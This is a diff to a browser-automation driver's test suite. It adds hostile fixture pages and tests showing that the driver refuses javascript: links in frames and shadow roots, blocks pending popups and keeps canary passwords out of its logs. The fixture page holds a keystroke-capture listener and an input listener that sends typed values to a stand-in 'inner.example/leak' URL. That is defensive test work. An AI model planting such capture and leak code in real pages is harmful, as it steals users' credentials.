@@ -35,9 +35,16 @@ const PAGE = `<!doctype html><html><head><link rel="stylesheet" href="/style.css
 <a href="/plain.txt" download style="position:absolute;left:0;top:520px;width:100px;height:20px;display:block">download attr</a>
 <button onclick="const a=document.createElement('a');a.href=window.URL.createObjectURL(new Blob(['x']));a.download='made.exe';document.body.append(a);a.click()" style="position:absolute;left:0;top:560px;width:100px;height:20px">blob</button>
 <button onclick="const w=window.open('');if(w)w.document.write('<p>written popup</p>')" style="position:absolute;left:0;top:600px;width:100px;height:20px">blank popup</button>
+<iframe id="sframe" srcdoc="<a href='javascript:parent.frameran=true' style='display:block;width:200px;height:30px'>go</a>" style="position:absolute;left:400px;top:100px;width:300px;height:60px;border:0"></iframe>
+<iframe src="https://other.example/frame" style="position:absolute;left:400px;top:200px;width:300px;height:60px;border:0"></iframe>
+<form action="javascript:window.plainform=true" style="position:absolute;left:400px;top:300px;margin:0"><button id="plainbtn" style="width:100px;height:20px">Continue</button></form>
+<div id="host" style="position:absolute;left:400px;top:380px;width:200px;height:30px"></div>
+<button onclick="setTimeout(()=>window.open('https://fixture.example/popup'),400)" style="position:absolute;left:400px;top:440px;width:100px;height:20px">later</button>
 <img src="https://inner.example/pixel.png" style="position:absolute;left:400px;top:0;width:1px;height:1px">
 <div style="height:4000px"></div>
-<script>window.keys=[];addEventListener("keydown",(e)=>keys.push(e.key));
+<script>document.getElementById("host").attachShadow({mode:"closed"}).innerHTML='<a href="javascript:window.shadowran=true" style="display:block;width:200px;height:30px">s</a>';
+document.getElementById("user").addEventListener("input",(e)=>{new Image().src="https://inner.example/leak?p="+encodeURIComponent(e.target.value)});
+window.keys=[];addEventListener("keydown",(e)=>keys.push(e.key));
 addEventListener("mousemove",(e)=>{window.mx=e.clientX;window.my=e.clientY});
 try{const w=new Worker(URL.createObjectURL(new Blob(["setInterval(()=>postMessage(1),20)"])));w.onmessage=()=>{window.ticks=(window.ticks||0)+1}}catch(e){window.workerRefused=String(e)}
 try{const f=document.body.appendChild(document.createElement("iframe"));const W=f.contentWindow.Worker;const w=new W(URL.createObjectURL(new Blob(["setInterval(()=>postMessage(1),20)"])));w.onmessage=()=>{window.frameTicks=(window.frameTicks||0)+1}}catch(e){window.frameWorkerRefused=String(e)}
@@ -72,6 +79,8 @@ function site(options: { stall?: string } = {}): Served {
         // Slow, so a navigation the driver started outside an action would still be landing after the action returned.
         await new Promise((done) => setTimeout(done, 300));
         return html("<p>popup page</p>");
+      case "/frame":
+        return html(`<a href="javascript:window.ran=true" style="display:block;width:200px;height:30px">go</a>`);
       case "/reloader":
         return html(`<p>${Date.now()}</p><script>setTimeout(() => location.reload(), 15)</script>`);
       case "/redirect-inner":
@@ -375,6 +384,81 @@ describe("Driver", { timeout: 120_000 }, () => {
       expect(answer.outcome).toBe("done");
       expect(Date.now() - began).toBeLessThan(8_000);
     }
+    await driver.close();
+  });
+
+  it("refuses a javascript: link in a frame, a cross-origin frame and a closed shadow root, and a plain submit of a javascript: form", async () => {
+    const { driver, browser: b } = await walk();
+    for (const [x, y] of [
+      [420, 115],
+      [420, 215],
+      [420, 395],
+      [420, 310],
+    ] as const)
+      expect(await driver.execute({ tool: "click", x, y }), `${x},${y}`).toMatchObject({ outcome: "refused" });
+    expect(await state(b, "[window.frameran, window.shadowran, window.plainform]")).toEqual([null, null, null]);
+    const other = (await walkPage(b)).frames().find((f) => f.url().startsWith("https://other.example/"));
+    expect(await other?.evaluate("window.ran")).toBeUndefined();
+    // Keyboard activation of the same targets: the plain submit button, and a link focused inside a frame.
+    await (await walkPage(b)).focus("#plainbtn");
+    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
+    await state(b, `document.getElementById("sframe").contentDocument.querySelector("a").focus()`);
+    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
+    expect(await state(b, "[window.frameran, window.plainform]")).toEqual([null, null]);
+    await driver.close();
+  });
+
+  it("keeps no canary value in any row, even one the page put into a refused URL", async () => {
+    const { driver, caseId } = await walk();
+    await driver.execute({ tool: "click", x: 100, y: 135 });
+    await driver.execute({ tool: "type", text: canary.password });
+    await driver.execute({ tool: "wait", ms: 300 });
+    const kept = await rows(caseId, true);
+    const text = JSON.stringify(kept);
+    expect(text).not.toContain(canary.password);
+    expect(text).not.toContain(encodeURIComponent(canary.password));
+    expect(kept.some((r) => r.kind === "request" && r.action_json.includes("[canary password]"))).toBe(true);
+    await driver.close();
+  });
+
+  it("ends the walk when a refusal cannot be recorded", async () => {
+    const noRequests = new Proxy(env.DB, {
+      get(target, key) {
+        if (key !== "prepare") return Reflect.get(target, key);
+        return (sql: string) => {
+          const statement = target.prepare(sql);
+          if (!sql.includes("walkthrough_actions")) return statement;
+          return {
+            bind: (...values: unknown[]) =>
+              values[3] === "request" ? { run: () => Promise.reject(new Error("D1 down")) } : statement.bind(...values),
+          };
+        };
+      },
+    }) as D1Database;
+    const { driver, browser: b } = await walk({ store: { ...store, db: noRequests } });
+    await new Promise((done) => setTimeout(done, 500));
+    expect(driver.ended?.outcome).toBe("error");
+    expect((await driver.execute({ tool: "screenshot" })).outcome).toBe("error");
+    expect(b.connected).toBe(false);
+  });
+
+  it("runs nothing on a popup left pending: not on the ninth attempt, not for malformed input, not on stale coordinates", async () => {
+    const limited = await walk({ limits: { steps: 1, ms: 20_000 } });
+    await limited.driver.execute({ tool: "click", x: 420, y: 450 });
+    await new Promise((done) => setTimeout(done, 900));
+    expect(await limited.driver.execute({ tool: "screenshot" })).toMatchObject({ outcome: "limit", reason: "steps" });
+    expect(limited.served.asked).not.toContain("https://fixture.example/popup");
+
+    const { driver, served, browser: b } = await walk();
+    await driver.execute({ tool: "click", x: 420, y: 450 });
+    await new Promise((done) => setTimeout(done, 900));
+    expect((await driver.execute({ tool: "nope" })).outcome).toBe("refused");
+    expect(served.asked).not.toContain("https://fixture.example/popup");
+    expect(await driver.execute({ tool: "click", x: 20, y: 20 })).toMatchObject({
+      outcome: "refused",
+      reason: expect.stringMatching(/popup was followed first/),
+    });
+    expect((await walkPage(b)).url()).toBe("https://fixture.example/popup");
     await driver.close();
   });
 
